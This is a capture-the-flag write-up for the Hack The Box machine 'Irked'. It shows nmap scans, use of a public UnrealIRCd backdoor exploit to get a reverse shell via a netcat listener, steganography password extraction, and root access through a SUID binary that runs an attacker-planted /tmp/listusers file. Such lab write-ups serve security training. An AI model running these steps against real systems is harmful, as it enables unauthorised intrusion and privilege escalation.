# Irked	

Machine Level: Easy <br />
OS: Linux

## Scanning 
I ran an aggressive NMAP scan to find the services and ports that were open. 
```
ajread@aj-ubuntu:~$ nmap -A [REMOTE IP] -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-11 19:41 EST
Nmap scan report for [REMOTE IP]
Host is up (0.015s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          46610/udp   status
|   100024  1          52443/tcp   status
|   100024  1          53455/tcp6  status
|_  100024  1          57796/udp6  status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.66 seconds
```
I also ran a full nmap scan to see if I missed any open ports. 
```
ajread@aj-ubuntu:~$ nmap -p- [REMOTE IP] -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-11 19:42 EST
Nmap scan report for [REMOTE IP]
Host is up (0.024s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
6697/tcp  open  ircs-u
8067/tcp  open  infi-async
52443/tcp open  unknown
65534/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 49.36 seconds
```
## Enumeration 
I noticed that port 6697 was running ircs-u. I wanted to confirm which version of IRC was running since I knew there was an exploit that I could throw. 
```
ajread@aj-ubuntu:~$ nmap -p6697 -sV -sC [REMOTE IP] -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-11 19:52 EST
Nmap scan report for [REMOTE IP]
Host is up (0.013s latency).

PORT     STATE SERVICE VERSION
6697/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.82 seconds
```
I didnt get much information but I was able to run the unrealirc backdoor nmap script. 
```
ajread@aj-ubuntu:~$ nmap -sV -p6697 --script=irc-unrealircd-backdoor [REMOTE IP] -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-11 19:56 EST
Nmap scan report for [REMOTE IP]
Host is up (0.013s latency).

PORT     STATE SERVICE VERSION
6697/tcp open  irc     UnrealIRCd
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
Service Info: Host: irked.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.43 seconds
```
## Initial Access
There was a metasploit module with unreal_ircd_3281_backdoor that can run commands. However, I wanted to use [this](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor) POC written in Python to understand the backdoor better. I sent the exploit with the correct commands. 
```
ajread@aj-ubuntu:~/hackthebox/playground$ python3 exploit.py [REMOTE IP] 6697 -payload python
Exploit sent successfully!
```
I started a netcat listener and was dropped into a shell. 
```
ajread@aj-ubuntu:~$ nc -lnvp 9999
Listening on 0.0.0.0 9999
Connection received on [REMOTE IP] 33553
ircd@irked:~/Unreal3.2$ whoami
whoami
ircd
```
I wasnt able to read the user.txt file with my permissions. 
```
ircd@irked:/home/djmardov$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```
However, there was a ```.backup``` file with an interesting steg file comment about a ```pw``` or password. 
```
ircd@irked:/home/djmardov/Documents$ cat .backup
cat .backup
Super elite steg backup pw
[REDACTED]
```
I navigated to the website on port 80 and noticed that there is a jpeg that could be related to the stego. I downloaded the jpeg and extracted the contents using the ```pw```. 
```
ajread@aj-ubuntu:~/hackthebox/playground$ steghide extract -sf irked.jpg 
Enter passphrase: 
wrote extracted data to "pass.txt".
```
I was able to ssh into the machine using the extracted ```pass.txt``` from the jpeg. And I was able to find the user flag.
```
djmardov@irked:~$ wc -c user.txt 
33 user.txt
```
## Privilege Escalation 
I looked for binaries that could be used for privilege escalation. 
```
djmardov@irked:~$ find /usr -perm -4000
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
```
It looked like ```/usr/bin/viewuser``` is owned by root and can be run as root. I ran the command and it appeared to call a tmp file named ```listusers```. 
```
djmardov@irked:~$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2023-02-11 19:40 (:0)
djmardov pts/1        2023-02-11 20:13 ([LOCAL IP])
sh: 1: /tmp/listusers: not found
```
I created a fake list with only a shell.
```
djmardov@irked:~$ cat /tmp/listusers 
/bin/sh
```
I then made the file an executable to run. 
```
djmardov@irked:~$ chmod +x /tmp/listusers 
```
And then I ran ```viewuser``` and I was dropped into a privileged shell. 
```
djmardov@irked:~$ viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2023-02-11 19:40 (:0)
djmardov pts/1        2023-02-11 20:13 ([LOCAL IP])
# whoami
root
# id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```
I was able to read the root flag! 
```
# wc -c /root/root.txt
33 /root/root.txt
```